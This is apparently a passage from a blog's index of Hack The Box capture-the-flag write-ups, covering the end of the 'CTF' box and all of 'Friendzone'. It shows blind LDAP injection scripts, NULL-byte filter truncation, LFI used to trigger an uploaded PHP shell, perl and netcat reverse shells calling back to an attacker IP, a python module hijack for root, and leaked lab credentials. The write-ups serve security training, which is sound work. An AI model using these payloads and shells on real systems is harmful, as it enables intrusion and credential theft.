  229 W\t   2810 Ch\t  \"!@#%^&amp;*\"000066:  C=200     68 L\t     229 W\t   2810 Ch\t  \"123456*a\"000008:  C=200     68 L\t     229 W\t   2810 Ch\t  \"!@#%^&amp;*(\"000009:  C=200     68 L\t     229 W\t   2810 Ch\t  \"!@#%^&amp;*()\"005122:  C=200     68 L\t     229 W\t   2810 Ch\t  \"Ch4ng3m3!\"005724:  C=200     68 L\t     229 W\t   2810 Ch\t  \"*%�Cookie:\"009378:  C=200     68 L\t     229 W\t   2810 Ch\t  \"!!Huawei\"011498:  C=200     68 L\t     231 W\t   2822 Ch\t  \"ldapuser\"     &lt;------[...]Based on the wfuzz output, I notice that some of the characters seem to be blacklisted by the system. Whenever I use the following characters, the page doesn’t return any message at all: ! &amp; * () = \\ | &lt;&gt; ~\tThe only valid user I found is: ldapuser. When I try that user on the login page, I get a Cannot login error message instead of User not found.Testing for LDAP injectionNow that I have the username, I can guess the next part involves LDAP injection. I can get around the blacklisting of the characters by using double URL encoding: ) becomes %2529 instead of %29.I made a quick script to test different payloads. The script URL encodes the payload twice (once with urllib.quote and the other one automatically with the post method).#!/usr/bin/pythonimport reimport requestsimport urllibdef main():\t\twhile True:\t\tcmd = raw_input(\"&gt; \")\t\tdata = {\t\t\t\"inputUsername\": urllib.quote(cmd),\t\t\t\"inputOTP\": \"12345\",\t\t}\t\tproxy = {\"http\": \"http://127.0.0.1:8080\"}\t\tprint(\"Payload: {}\".format(data['inputUsername']))\t\t\t\tr = requests.post(\"http://ctf.htb/login.php\", data=data, proxies=proxy)\t\tm = re.search(r'&lt;form action=\"/login.php\" method=\"post\" &gt;\\s+&lt;div class=\"form-group row\"&gt;\\s+&lt;div class=\"col-sm-10\"&gt;\\s+(.*)&lt;/div&gt;', r.text)\t\tif m:\t\t\ttry:\t\t\t\tprint(m.group(1))\t\t\t\t\t\t\texcept IndexError:\t\t\t\tprint(\"Something weird happened\")if __name__== \"__main__\":\tmain()Test #1: Invalid username, no injection&gt; invalidPayload: invalidUser invalid not foundResult: User is not found as expected.Test #2: Valid username, no injection&gt; ldapuserPayload: ldapuserCannot loginResult: User is found but I get an error message because OTP is invalid.Test #3: Basic injection assuming a search filter like (&amp;(user) **rest of the query**&gt; ldapuser)(&amp;Payload: ldapuser%29%28%26Cannot loginResult: I’ve successfully identified that LDAP injection is possible since the query returns a resultTest #4: Injection with invalid query to test behaviour of the page when it errors out&gt; ldapuser)(bad_ldap_search)))))(((((Payload: ldapuser%29%28bad_ldap_search%29%29%29%29%29%28%28%28%28%28Result: I don’t get anything back, the page basically refreshes when it gets an invalid query. This is what I saw earlier when fuzzing the page with invalid characters. The characters are not necessarily invalid but they resulted in an invalid LDAP search filter when I was fuzzing.Conclusion: This is a blind LDAP injection since the page doesn’t return the results of the query in a field on the page or in an error messageLDAP injection to get the OTP tokenThe first thing I did next was to try to find out which LDAP attributes are valid in the database. The list of common LDAP attributes is available on multiple websites, and we already have a hint from the HTML comments that the application uses a common LDAP attribute to store the token.I modified my script to run through the entire list of attributes and try a query resulting in: (uid=*)(attribute_to_test=*). If the attribute exists, the query should return a result and I should get the Cannot login message.#!/usr/bin/pythonimport reimport requestsimport timeimport urllibdef main():\twith open(\"attributes.txt\") as f:\t\tattributes = f.read().splitlines()\tfor attribute in attributes:\t\tpayload = \"*)({}=*\".format(attribute)\t\tdata = {\t\t\t\"inputUsername\": urllib.quote(payload),\t\t\t\"inputOTP\": \"12345\",\t\t}\t\tproxy = {\"http\": \"http://127.0.0.1:8080\"}\t\t\t\ttime.sleep(0.5)\t\tr = requests.post(\"http://ctf.htb/login.php\", data=data, proxies=proxy)\t\tm = re.search(r'&lt;form action=\"/login.php\" method=\"post\" &gt;\\s+&lt;div class=\"form-group row\"&gt;\\s+&lt;div class=\"col-sm-10\"&gt;\\s+(.*)&lt;/div&gt;', r.text)\t\tif m:\t\t\ttry:\t\t\t\tif \"Cannot login\" in m.group(1):\t\t\t\t\tprint(\"Attribute {}: exists!\".format(attribute))\t\t\t\t\t\t\texcept IndexError:\t\t\t\tprint(\"Something weird happened\")if __name__== \"__main__\":\tmain()Results are shown here:# python ldapattributes.py Attribute cn: exists!Attribute gidNumber: exists!Attribute homeDirectory: exists!Attribute loginShell: exists!Attribute mail: exists!Attribute pager: exists!Attribute shadowLastChange: exists!Attribute shadowMax: exists!Attribute shadowMin: exists!Attribute shadowWarning: exists!Attribute sn: exists!Attribute uid: exists!Attribute uidNumber: exists!Attribute userPassword: exists!So now that I have a list of valid attributes, I can iterate through a character set using the same boolean blind technique to get the values of each attribute.More bad python code below:#!/usr/bin/pythonimport reimport requestsimport sysimport timeimport urllibcharset = \"abcdefghijklmnopqrstuvwxyz\"charset += \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"charset += \"0123456789_-\"def main():\t\twith open(\"valid_attributes.txt\") as f:\t\tattributes = f.read().splitlines()\tfor attribute in attributes:\t\t\tldapfield = \"\"\t\twhile True:\t\t\tfor c in charset:\t\t\t\tkeep_going = False\t\t\t\tpayload = \"*)({}={}\".format(attribute, ldapfield + c + \"*\")\t\t\t\t\t\t\t\tdata = {\t\t\t\t\t\"inputUsername\": urllib.quote(payload),\t\t\t\t\t\"inputOTP\": \"12345\",\t\t\t\t}\t\t\t\tproxy = {\"http\": \"http://127.0.0.1:8080\"}\t\t\t\t\t\t\t\t\ttime.sleep(0.5)\t\t\t\tr = requests.post(\"http://ctf.htb/login.php\", data=data, proxies=proxy)\t\t\t\tm = re.search(r'&lt;form action=\"/login.php\" method=\"post\" &gt;\\s+&lt;div class=\"form-group row\"&gt;\\s+&lt;div class=\"col-sm-10\"&gt;\\s+(.*)&lt;/div&gt;', r.text)\t\t\t\tif m:\t\t\t\t\ttry:\t\t\t\t\t\t\t\t\t\t\t\tif \"Cannot login\" in m.group(1):\t\t\t\t\t\t\tldapfield = ldapfield + c\t\t\t\t\t\t\tkeep_going = True\t\t\t\t\t\t\tbreak\t\t\t\t\texcept IndexError:\t\t\t\t\t\tprint(\"Something weird happened\")\t\t\t\t\t\texit(1)\t\t\tif keep_going == False:\t\t\t\t# Charset rolled over, we're done here\t\t\t\tprint(\"LDAP attribute {} = {}\".format(attribute, ldapfield))\t\t\t\tldapfield = \"\"\t\t\t\tbreakif __name__== \"__main__\":\tmain()Dumping takes a long time because of the sleep timer I added so I don’t get blocked:# python ldapdump.py LDAP attribute cn = ldapuserLDAP attribute gidNumber = LDAP attribute homeDirectory = LDAP attribute loginShell = LDAP attribute mail = ldapuser@ctf.htbLDAP attribute pager = 285449490011357156531651545652335570713167411445727140604172141456711102716717000At last, I found the OTP token: 285449490011357156531651545652335570713167411445727140604172141456711102716717000I can use stoken to generate OTPs. I just need to import the token first:# stoken import --token=285449490011357156531651545652335570713167411445727140604172141456711102716717000Enter new password: Confirm new password:I can now generate OTPs:root@ragingunicorn:~# stoken Enter PIN:PIN must be 4-8 digits.  Use '0000' for no PIN.Enter PIN:43589231Note: The server time must match the one of my machine otherwise the password won’t be valid. Normally in real life this shouldn’t be a problem because both client and server are normally synched to an NTP source. Because this is HTB and the boxes don’t have internet access, there’s a clock drift of several minutes so I had to adjust the time on my machine to match the one from the box. I used the following cURL request to get the time from the server:# curl -s --stderr - -v 10.10.10.122 | grep Date&lt; Date: Tue, 05 Feb 2019 02:00:29 GMTSo I can now log in using ldapuser and a generated token. I get redirected to /page.php after successfully logging in.However when I try to send a command, I get an error message about not being part of the right group:LDAP injection to get access to the command execution pageWhat I need to do now is trick the server into letting me log in as ldapuser but also skip whatever group membership check is done on page.php.Assuming the LDAP query is something like: (&amp;(uid=user)(|(gid=root)(gid=adm))(token=*)), it seems impossible to inject the query in a way that’ll make the query valid and also skip the last part of the query. What I can do however is use a NULL character in the username so I can terminate the LDAP query wherever I want.I modifed my earlier script to add an extra NULL byte at the end (URL encoded):data = {\t\t\t\"inputUsername\": urllib.quote(cmd)+'%00',\t\t\t\"inputOTP\": \"12345\",\t\t}I just need to find how many parentheses are required to close the query:# python ldapinject.py &gt; ldapuser)ldapuser%29%00&gt; ldapuser))ldapuser%29%29%00&gt; ldapuser)))ldapuser%29%29%29%00Cannot login    That last query was valid. What I do next is modify the script a little more so I can send a valid login request with the correct OTP:data = {\t\t\t\"inputUsername\": urllib.quote(cmd)+'%00',\t\t\t\"inputOTP\": str(sys.argv[1]),\t\t}I recompiled cli.c in the stoken source code to use a hardcoded PIN of 0000 so I can pipe the token directly with user input. Yes I know you can pass a parameter to specify the PIN but I found out after, haha.if (get_pin &amp;&amp; securid_pin_required(t) &amp;&amp; (!strlen(t-&gt;pin) || opt_pin)) {\txstrncpy(t-&gt;pin, \"0000\", 4);}This make using the injection script a bit easier:# ./stoken14780441# python ldapinject.py $(./stoken)&gt; ldapuser)))ldapuser%29%29%29%00Login ok    {'Content-Length': '2818', 'X-Powered-By': 'PHP/5.4.16', 'Set-Cookie': 'PHPSESSID=urdd46i8obcnkkso4glf66cic1; path=/', 'Expires': 'Thu, 19 Nov 1981 08:52:00 GMT', 'Keep-Alive': 'timeout=5, max=100', 'Server': 'Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16', 'Connection': 'Keep-Alive', 'Location': '/page.php', 'Pragma': 'no-cache', 'Cache-Control': 'no-store, no-cache, must-revalidate, post-check=0, pre-check=0', 'Date': 'Tue, 05 Feb 2019 02:20:43 GMT', 'Content-Type': 'text/html; charset=UTF-8'}It seems I got a valid login and a session cookie, let’s put that in Firefox and see if I can issue commands on page.php:Nice, I got RCE now.Getting a shellI can easily get a shell with a standard perl reverse shell payload:perl -e 'use Socket;$i=\"10.10.14.23\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};'# nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.122] 34436sh: no job control in this shellsh-4.2$ ididuid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0I don’t have a lot of privileges though. I’ll have to escalate to another user before I can find user.txt:sh-4.2$ cd /homecd /homesh-4.2$ lslsls: cannot open directory .: Permission deniedI can read source files from the PHP application and find the password for ldapuser:sh-4.2$ cat login.php&lt;!doctype html&gt;&lt;?phpsession_start();$strErrorMsg=\"\";$username = 'ldapuser';$password = 'e398e27d5c4ad45086fe431120932a01';I’m now able to SSH in with those credentials and get user.txt:# ssh ldapuser@10.10.10.122ldapuser@10.10.10.122's password: [ldapuser@ctf ~]$ cat user.txt74a8e8...PrivescThe content of /backup is interesting: there’s a script that appears to run in a cronjob, archiving files into the folder:[ldapuser@ctf backup]$ ls -latotal 52drwxr-xr-x.  2 root root 4096 Feb  6 01:01 .dr-xr-xr-x. 18 root root  238 Jul 31  2018 ..-rw-r--r--.  1 root root   32 Feb  6 00:51 backup.1549410661.zip-rw-r--r--.  1 root root   32 Feb  6 00:52 backup.1549410721.zip-rw-r--r--.  1 root root   32 Feb  6 00:53 backup.1549410781.zip-rw-r--r--.  1 root root   32 Feb  6 00:54 backup.1549410841.zip-rw-r--r--.  1 root root   32 Feb  6 00:55 backup.1549410901.zip-rw-r--r--.  1 root root   32 Feb  6 00:56 backup.1549410961.zip-rw-r--r--.  1 root root   32 Feb  6 00:57 backup.1549411021.zip-rw-r--r--.  1 root root   32 Feb  6 00:58 backup.1549411081.zip-rw-r--r--.  1 root root   32 Feb  6 00:59 backup.1549411141.zip-rw-r--r--.  1 root root   32 Feb  6 01:00 backup.1549411201.zip-rw-r--r--.  1 root root   32 Feb  6 01:01 backup.1549411261.zip-rw-r--r--.  1 root root    0 Feb  6 01:01 error.log-rwxr--r--.  1 root root  975 Oct 23 14:53 honeypot.shThe script honeypot is shown below. In a nutshell:  It generates archive filenames based on the date/time  Encryption password for the archive is an md5hash of a generated password based in the root hash. No way we can recover this password.  All the files from /var/www/html/uploads are archived into /backupIt doesn’t seem possible to abuse some of the bash wildcards that I used to solve another HTB box since the script passes the -- flag that prevents processing further flags.[ldapuser@ctf backup]$ cat honeypot.sh # get banned ips from fail2ban jails and update banned.txt# banned ips directily via firewalld permanet rules are **not** included in the list (they get kicked for only 10 seconds)/usr/sbin/ipset list | grep fail2ban -A 7 | grep -E '[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}' | sort -u &gt; /var/www/html/banned.txt# awk '$1=$1' ORS='&lt;br&gt;' /var/www/html/banned.txt &gt; /var/www/html/testfile.tmp &amp;&amp; mv /var/www/html/testfile.tmp /var/www/html/banned.txt# some vars in order to be sure that backups are protectednow=$(date +\"%s\")filename=\"backup.$now\"pass=$(openssl passwd -1 -salt 0xEA31 -in /root/root.txt | md5sum | awk '{print $1}')# keep only last 10 backupscd /backupls -1t *.zip | tail -n +11 | xargs rm -f# get the files from the honeypot and backup 'em allcd /var/www/html/uploads7za a /backup/$filename.zip -t7z -snl -p$pass -- *# cleaup the honeypotrm -rf -- *# comment the next line to get errors for debuggingtruncate -s 0 /backup/error.logWhen I look at the 7za man page, I see that there is a @listfiles argument I can pass at the end:7za &lt;command&gt; [&lt;switches&gt;... ] &lt;archive_name&gt; [&lt;file_names&gt;... ] [&lt;@listfiles&gt;... ]  You can supply one or more filenames or wildcards for special list files (files containing lists of files). The filenames in such list file must be separated by new line symbol(s).  For list files, 7-Zip uses UTF-8 encoding by default. You can change encoding using -scs switch.  Multiple list files are supported.  For example, if the file “listfile.txt” contains the following:  My programs*.cpp   Src*.cppthen the command  7z a -tzip archive.zip @listfile.txtadds to the archive “archive.zip” all “*.cpp” files from directories “My programs” and “Src”.So by placing a file starting with an @ character in the uploads folder, the 7-zip archiver will attempt to read a list of file to compress from the file name specified after the @ sign. By referencing a symlink to root.txt instead of a file containing filenames, 7-zip tries to read the flag and I can see it in the error log file.drwxrwxrwx. 2 apache   apache    31 Feb  5 21:21 .drwxr-xr-x. 6 root     root     176 Oct 23 22:14 ..lrwxrwxrwx. 1 ldapuser ldapuser  14 Feb  5 21:21 test -&gt; /root/root.txt-rw-rw-r--. 1 ldapuser ldapuser   0 Feb  5 21:21 @testAfter a minute, the script executes, gets the file to read from @test and then …lapuser@ctf backup]$ tail -f error.logCommand Line Error:Cannot find listfilelistfile.txttail: error.log: file truncatedWARNING: No more filesfd6d2e..."
  },
  
  {
    "title": "Friendzone - Hack The Box",
    "url": "/posts/htb-writeup-friendzone/",
    "categories": "hackthebox, infosec",
    "tags": "smb, smbmap, vhosts, php, python, cronjob, dns, axfr",
    "date": "2019-07-13 00:00:00 +0800",
    





    
    "snippet": "Friendzone is an easy box with some light enumeration of open SMB shares and sub-domains. I used an LFI vulnerability combined with a writable SMB share to get RCE and a reverse shell. A cron job r...",
    "content": "Friendzone is an easy box with some light enumeration of open SMB shares and sub-domains. I used an LFI vulnerability combined with a writable SMB share to get RCE and a reverse shell. A cron job running as root executes a python script every few minutes and the OS module imported by the script is writable so I can modify it and add code to get a shell as root.Summary  A SMB share I access to contains credentials  I can do a zone transfer and find a bunch of sub-domains  The dashboard page contains an LFI which I can use in combination with the writable SMB share to get RCE  After getting a shell as www-data, I find plaintext credentials that I use to log in as user friend  A python script using os.py runs as root and os.py is writable so I can add code to get a reverse shell as rootDetailed stepsNmap scanThe box has a got a couple of services running. I take note of the DNS server since this could be used to do a DNS zone transfer and query various records that may contain useful information.# nmap -sC -sV -p- 10.10.10.123Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-09 19:05 ESTNmap scan report for friendzone.htb (10.10.10.123)Host is up (0.013s latency).Not shown: 65528 closed portsPORT    STATE SERVICE     VERSION21/tcp  open  ftp         vsftpd 3.0.322/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)| dns-nsid: |_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Friend Zone Escape software139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)443/tcp open  ssl/http    Apache httpd 2.4.29|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: 404 Not Found| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO| Not valid before: 2018-10-05T21:02:30|_Not valid after:  2018-11-04T21:02:30|_ssl-date: TLS randomness does not represent time| tls-alpn: |   http/1.1|_  http/1.1445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)Service Info: Hosts: FRIENDZONE, 127.0.0.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelFTP siteAnonymous access is not allowed on the FTP server:# ftp 10.10.10.123Connected to 10.10.10.123.220 (vsFTPd 3.0.3)Name (10.10.10.123:root): anonymous331 Please specify the password.Password:530 Login incorrect.Login failed.Nothing pops up on Exploit-DB for this version of vsFTPd so I’ll move on.Web enumerationThe site is just a simple page with nothing interactive on it but there is a domain name at the bottom which I’ll investigate further.SMB sharesUsing smbmap I can list the shares on the box:# smbmap -H 10.10.10.123[+] Finding open SMB ports....[+] Guest SMB session established on 10.10.10.123...[+] IP: 10.10.10.123:445\tName: friendzone.htb                                    \tDisk                                                  \tPermissions\t----                                                  \t-----------\tprint$                                            \tNO ACCESS\tFiles                                             \tNO ACCESS\tgeneral                                           \tREAD ONLY\tDevelopment                                       \tREAD, WRITE\tIPC$                                              \tNO ACCESSI can also find where the shares on the filesystem are mapped with the smb-enum-shares nmap script:# nmap -p 445 --script=smb-enum-shares 10.10.10.123Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-09 20:52 ESTNmap scan report for friendzone.htb (10.10.10.123)Host is up (0.0089s latency).PORT    STATE SERVICE445/tcp open  microsoft-dsHost script results:| smb-enum-shares: |   account_used: guest|   \\\\10.10.10.123\\Development: |     Type: STYPE_DISKTREE|     Comment: FriendZone Samba Server Files|     Users: 0|     Max Users: &lt;unlimited&gt;|     Path: C:\\etc\\Development|     Anonymous access: READ/WRITE|     Current user access: READ/WRITE|   \\\\10.10.10.123\\Files: |     Type: STYPE_DISKTREE|     Comment: FriendZone Samba Server Files /etc/Files|     Users: 0|     Max Users: &lt;unlimited&gt;|     Path: C:\\etc\\hole|     Anonymous access: &lt;none&gt;|     Current user access: &lt;none&gt;|   \\\\10.10.10.123\\IPC$: |     Type: STYPE_IPC_HIDDEN|     Comment: IPC Service (FriendZone server (Samba, Ubuntu))|     Users: 1|     Max Users: &lt;unlimited&gt;|     Path: C:\\tmp|     Anonymous access: READ/WRITE|     Current user access: READ/WRITE|   \\\\10.10.10.123\\general: |     Type: STYPE_DISKTREE|     Comment: FriendZone Samba Server Files|     Users: 0|     Max Users: &lt;unlimited&gt;|     Path: C:\\etc\\general|     Anonymous access: READ/WRITE|     Current user access: READ/WRITE|   \\\\10.10.10.123\\print$: |     Type: STYPE_DISKTREE|     Comment: Printer Drivers|     Users: 0|     Max Users: &lt;unlimited&gt;|     Path: C:\\var\\lib\\samba\\printers|     Anonymous access: &lt;none&gt;|_    Current user access: &lt;none&gt;Nmap done: 1 IP address (1 host up) scanned in 2.82 secondsListing files from the share:# smbmap -H 10.10.10.123 -r[+] Finding open SMB ports....[+] Guest SMB session established on 10.10.10.123...[+] IP: 10.10.10.123:445\tName: friendzone.htb                                    \tDisk                                                  \tPermissions\t----                                                  \t-----------\tprint$                                            \tNO ACCESS\tFiles                                             \tNO ACCESS\tgeneral                                           \tREAD ONLY\t./                                                 \tdr--r--r--                0 Wed Jan 16 15:10:51 2019\t.\tdr--r--r--                0 Wed Jan 23 16:51:02 2019\t..\tfr--r--r--               57 Tue Oct  9 19:52:42 2018\tcreds.txt\tDevelopment                                       \tREAD, WRITE\t./                                                 \tdr--r--r--                0 Sat Feb  9 15:50:02 2019\t.\tdr--r--r--                0 Wed Jan 23 16:51:02 2019\t..\tIPC$                                              \tNO ACCESScreds.txt looks interesting:# smbclient -U \"\" //10.10.10.123/generalEnter HTB\\'s password: Try \"help\" to get a list of possible commands.smb: \\&gt; get creds.txtgetting file \\creds.txt of size 57 as creds.txt (1.6 KiloBytes/sec) (average 1.6 KiloBytes/sec)smb: \\&gt; exitroot@ragingunicorn:~/htb/friendzone# cat creds.txtcreds for the admin THING:admin:WORKWORKHhallelujah@#Found some credentials: admin / WORKWORKHhallelujah@#Sub-domains enumerationNow that I have credentials, I just need to find where to use them.I can do a zone transfer for that domain I saw earlier on the main page and get the list of all sub-domains:# host -t axfr friendzone.red 10.10.10.123Trying \"friendzone.red\"Using domain server:Name: 10.10.10.123Address: 10.10.10.123#53Aliases: ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 56850;; flags: qr aa; QUERY: 1, ANSWER: 8, AUTHORITY: 0, ADDITIONAL: 0;; QUESTION SECTION:;friendzone.red.\t\t\tIN\tAXFR;; ANSWER SECTION:friendzone.red.\t\t604800\tIN\tSOA\tlocalhost. root.localhost. 2 604800 86400 2419200 604800friendzone.red.\t\t604800\tIN\tAAAA\t::1friendzone.red.\t\t604800\tIN\tNS\tlocalhost.friendzone.red.\t\t604800\tIN\tA\t127.0.0.1administrator1.friendzone.red. 604800 IN A\t127.0.0.1hr.friendzone.red.\t604800\tIN\tA\t127.0.0.1uploads.friendzone.red.\t604800\tIN\tA\t127.0.0.1friendzone.red.\t\t604800\tIN\tSOA\tlocalhost. root.localhost. 2 604800 86400 2419200 604800Received 250 bytes from 10.10.10.123#53 in 12 msI’ll add those entries to my local /etc/hosts.Upload pageThere’s a php application to upload images at https://uploads.friendzone.red.Whenever I upload a file (image or not), I get a successful message:Administrator pageThe https://administrator1.friendzone.red page contains a login form on which I can use the credentials I found in the SMB share.After logging in I am asked to go to dashboard.php.The dashboard page seems to be some application that deals with images, but it’s not really clear what it does except take an image name as a parameter and a pagename.If I try the parameters displayed on the page I get:The image is linked to /images, but none of the files I tried to upload from the previous upload page are found in that directory.There’s an LFI in the pagename parameter and I can use a PHP base64 encode filter to read files:Request: https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=pagename=php://filter/convert.base64-encode/resource=dashboardThe base64 encoded text is the source code for dashboard.php:&lt;?php//echo \"&lt;center&gt;&lt;h2&gt;Smart photo script for friendzone corp !&lt;/h2&gt;&lt;/center&gt;\";//echo \"&lt;center&gt;&lt;h3&gt;* Note : we are dealing with a beginner php developer and the application is not tested yet !&lt;/h3&gt;&lt;/center&gt;\";echo \"&lt;title&gt;FriendZone Admin !&lt;/title&gt;\";$auth = $_COOKIE[\"FriendZoneAuth\"];if ($auth === \"e7749d0f4b4da5d03e6e9196fd1d18f1\"){ echo \"&lt;br&gt;&lt;br&gt;&lt;br&gt;\";echo \"&lt;center&gt;&lt;h2&gt;Smart photo script for friendzone corp !&lt;/h2&gt;&lt;/center&gt;\";echo \"&lt;center&gt;&lt;h3&gt;* Note : we are dealing with a beginner php developer and the application is not tested yet !&lt;/h3&gt;&lt;/center&gt;\";if(!isset($_GET[\"image_id\"])){  echo \"&lt;br&gt;&lt;br&gt;\";  echo \"&lt;center&gt;&lt;p&gt;image_name param is missed !&lt;/p&gt;&lt;/center&gt;\";  echo \"&lt;center&gt;&lt;p&gt;please enter it to show the image&lt;/p&gt;&lt;/center&gt;\";  echo \"&lt;center&gt;&lt;p&gt;default is image_id=a.jpg&amp;pagename=timestamp&lt;/p&gt;&lt;/center&gt;\"; }else{ $image = $_GET[\"image_id\"]; echo \"&lt;center&gt;&lt;img src='images/$image'&gt;&lt;/center&gt;\"; echo \"&lt;center&gt;&lt;h1&gt;Something went worng ! , the script include wrong param !&lt;/h1&gt;&lt;/center&gt;\"; include($_GET[\"pagename\"].\".php\"); //echo $_GET[\"pagename\"]; }}else{echo \"&lt;center&gt;&lt;p&gt;You can't see the content ! , please login !&lt;/center&gt;&lt;/p&gt;\";}?&gt;The .php suffix is added automatically after the filename so I can’t arbitrarily read any files. I tried the PHP path truncation technique as well as adding null bytes at the end of string but I was not able to bypass this.I also dumped the upload.php source code and saw that the upload thing is just a troll since it doesn’t do anything.&lt;?php// not finished yet -- friendzone admin !if(isset($_POST[\"image\"])){echo \"Uploaded successfully !&lt;br&gt;\";echo time()+3600;}else{echo \"WHAT ARE YOU TRYING TO DO HOOOOOOMAN !\";}?&gt;Getting a shell with PHPThe Development share I saw earlier is writable by the guest user so I can upload a PHP reverse shell in there and use the LFI to trigger it. The full path of the share is /etc/Development as indicated in the nmap script output.# smbclient -U \"\" //10.10.10.123/DevelopmentEnter HTB\\'s password: Try \"help\" to get a list of possible commands.smb: \\&gt; put shell.phpputting file shell.php as \\shell.php (184.9 kb/s) (average 184.9 kb/s)smb: \\&gt; I trigger the shell with the following request: https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=/etc/Development/shell# nc -lvnp 5555listening on [any] 5555 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.123] 36974Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux 23:16:59 up 35 min,  0 users,  load average: 0.00, 0.00, 0.00USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can't access tty; job control turned off$ python -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@FriendZone:/$Found other credentials in the /var/www directory:www-data@FriendZone:/var/www$ ls -lals -latotal 36drwxr-xr-x  8 root root 4096 Oct  6 15:47 .drwxr-xr-x 12 root root 4096 Oct  6 02:07 ..drwxr-xr-x  3 root root 4096 Jan 16 22:13 admindrwxr-xr-x  4 root root 4096 Oct  6 01:47 friendzonedrwxr-xr-x  2 root root 4096 Oct  6 01:56 friendzoneportaldrwxr-xr-x  2 root root 4096 Jan 15 21:08 friendzoneportaladmindrwxr-xr-x  3 root root 4096 Oct  6 02:05 html-rw-r--r--  1 root root  116 Oct  6 15:47 mysql_data.confdrwxr-xr-x  3 root root 4096 Oct  6 01:39 uploadswww-data@FriendZone:/var/www$ cat mysql_data.confcat mysql_data.conffor development process this is the mysql creds for user frienddb_user=frienddb_pass=Agpyu12!0.213$db_name=FZThere’s a friend user in the local passwd database:www-data@FriendZone:/var/www$ grep friend /etc/passwdgrep friend /etc/passwdfriend:x:1000:1000:friend,,,:/home/friend:/bin/bashI can SSH in with those credentials and grab the user.txt flag:root@ragingunicorn:~/htb/friendzone# ssh friend@10.10.10.123Ilcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantageFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsYou have mail.Last login: Sat Feb  9 23:43:09 2019 from 10.10.14.23friend@FriendZone:~$ cat user.txta9ed20...Privesc/opt/server_admin contains a reporter.py script that probably runs every minutes in a root owned cronjob:friend@FriendZone:/opt/server_admin$ cat reporter.py #!/usr/bin/pythonimport osto_address = \"admin1@friendzone.com\"from_address = \"admin2@friendzone.com\"print \"[+] Trying to send email to %s\"%to_address#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass \"PAPAP\"'''#os.system(command)# I need to edit the script later# Sam ~ python developerI can confirm it’s running in a cronjob by using pspy:The script doesn’t really do anything except import the standard os module.Looking at the module definition, I see that the permissions are world writable on the one for Python 2.7:friend@FriendZone:/opt/server_admin$ find /usr -name os.py 2&gt;/dev/null/usr/lib/python3.6/os.py/usr/lib/python2.7/os.pyfriend@FriendZone:/opt/server_admin$ ls -l /usr/lib/python2.7/os.py-rwxrwxrwx 1 root root 25910 Jan 15 22:19 /usr/lib/python2.7/os.pyfriend@FriendZone:/opt/server_admin$ ls -l /usr/lib/python3.6/os.py-rw-r--r-- 1 root root 37526 Sep 12 21:26 /usr/lib/python3.6/os.pyI can modify the os.py file and add a reverse shell at the end so when the module is imported by the script it’ll execute my reverse shell.system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.23 5555 &gt;/tmp/f\")A few moments later I get a shell as root:# nc -lvnp 5555listening on [any] 5555 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.123] 60168/bin/sh: 0: can't access tty; job control turned off# iduid=0(root) gid=0(root) groups=0(root)# cat /root/root.txtb0e6c6..."
  },
  
  {
    "title": "Hackback - Hack The Box",
    "url": "/posts/htb-writeup-hackback/",
    "categories": "hackthebox, infosec",
    "tags": "windows, gophish, alpc, command injection, reversing, ntfs ads, powershell, regeorg, pivoting, fuzzing, php, asp, winrm, proxychains",
    "date": "2019-07-06 00:00:00 +0800",
    





    
    "snippet": "Hackback took me a long time to do. There are so many steps required just to get a shell. For extra difficulty, AppLocker is enabled and an outbound firewall policy is configured to block reverse s...",
